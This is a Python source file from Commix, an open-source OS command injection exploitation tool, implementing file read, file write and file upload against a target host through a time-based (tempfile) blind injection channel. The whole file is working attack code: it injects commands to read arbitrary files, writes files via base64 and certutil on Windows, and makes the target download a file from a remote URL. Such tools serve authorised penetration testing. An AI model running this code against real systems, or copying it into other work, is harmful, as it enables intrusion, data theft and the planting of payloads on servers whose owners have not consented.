#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
from src.core.injections.semiblind.techniques.file_based import fb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""
  
"""
Read a file from the target host.
"""
def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  file_to_read = menu.options.file_read
  # Execute command
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_FILE_READ + file_to_read
  else:
    cmd = settings.FILE_READ + file_to_read 
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    new_line = "\n"
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    
  shell = output
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  if settings.VERBOSITY_LEVEL >= 1 and menu.options.ignore_session:
    print ""
  if shell:
    success_msg = "The contents of file '"  
    success_msg += file_to_read + Style.RESET_ALL + Style.BRIGHT 
    success_msg += "'" + Style.RESET_ALL + " : "
    sys.stdout.write(settings.print_success_msg(success_msg))
    sys.stdout.flush()
    print shell
    output_file = open(filename, "a")
    success_msg = "The contents of file '"
    success_msg += file_to_read + "' : " + shell + ".\n"
    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
    output_file.close()
  else:
    warn_msg = "It seems that you don't have permissions "
    warn_msg += "to read the '" + file_to_read + "' file."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()

"""
Write to a file on the target host.
"""
def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    if settings.TARGET_OS == "win":
      import base64
      content = base64.b64encode(content)
  else:
    warn_msg = "It seems that '" + file_to_write + "' is not a file."
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
    sys.stdout.flush()
    
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest

  # Execute command
  if settings.TARGET_OS == "win":
    from src.core.injections.results_based.techniques.classic import cb_injector
    whitespace = settings.WHITESPACE[0]
    dest_to_write = dest_to_write.replace("\\","/")
    # Find path
    path = os.path.dirname(dest_to_write)
    path = path.replace("/","\\")
    # Chnage directory
    cmd = "cd " + path 
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Find filename
    filname = os.path.basename(dest_to_write)
    tmp_filname = "tmp_" + filname
    cmd = settings.FILE_WRITE + content + ">" + tmp_filname
    if not menu.options.alter_shell :
      cmd = "\"" + cmd + "\""
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Decode base 64 encoding
    cmd = "certutil -decode "  + tmp_filname + " " + filname 
    if not menu.options.alter_shell :
      cmd = "\"" + cmd + "\""
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
    cb_injector.injection_results(response, TAG, cmd)
    # Delete tmp file
    cmd = "del " + tmp_filname
    if not menu.options.alter_shell :
      cmd = "\"" + cmd + "\""
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)  
    cb_injector.injection_results(response, TAG, cmd)
    # Check if file exists
    cmd = "if exist " + filname + " (echo " + filname + ")" 
    if not menu.options.alter_shell :
      cmd = "'" + cmd + "'"
    dest_to_write = path + "\\" + filname

  else:
    cmd = settings.FILE_WRITE + "'" + content + "'" + ">" + "'" + dest_to_write + "'" + separator + settings.FILE_READ + dest_to_write
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    shell = output 
    shell = "".join(str(p) for p in shell)
    # Check if file exists
    cmd = "echo $(ls " + dest_to_write + ")"

  print ""
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  # if settings.VERBOSITY_LEVEL >= 1:
  #   print ""
  if shell:
    success_msg = "The '" +  shell + Style.RESET_ALL 
    success_msg += Style.BRIGHT + "' file was created successfully!\n" 
    sys.stdout.write("\n" + settings.print_success_msg(success_msg))
    sys.stdout.flush()
  else:
    warn_msg = "It seems that you don't have permissions to "
    warn_msg += "write the '" + dest_to_upload + "' file."  
    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")

"""
Upload a file on the target host.
"""
def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  if settings.TARGET_OS == "win":
    # Not yet implemented
    pass
  else:
    file_to_upload = menu.options.file_upload
    # check if remote file exists.
    try:
      urllib2.urlopen(file_to_upload)
    except urllib2.HTTPError, err_msg:
      warn_msg = "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err_msg)+ ")"
      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg) + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    shell = output 
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    if settings.TARGET_OS == "win":
      cmd = "dir " + dest_to_upload + ")"
    else:  
      cmd = "echo $(ls " + dest_to_upload + ")"
      
    print ""  
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    shell = output 
    try:
      shell = "".join(str(p) for p in shell)
    except TypeError:
      pass
    # if settings.VERBOSITY_LEVEL >= 1:
    #   print ""
    if shell:
      success_msg = "The '" +  shell + Style.RESET_ALL 
      success_msg += Style.BRIGHT + "' file was uploaded successfully!"
      sys.stdout.write("\n" + settings.print_success_msg(success_msg) + "\n")
      sys.stdout.flush()
    else:
      warn_msg = "It seems that you don't have permissions to "
      warn_msg += "write the '" + dest_to_upload + "' file."  
      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg) + "\n")

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):

  if menu.options.file_read:  
    file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.FILE_ACCESS_DONE == False:
      settings.FILE_ACCESS_DONE = True

  if menu.options.file_write:
    file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.FILE_ACCESS_DONE == False:
      settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.FILE_ACCESS_DONE == False:
      settings.FILE_ACCESS_DONE = True

# eof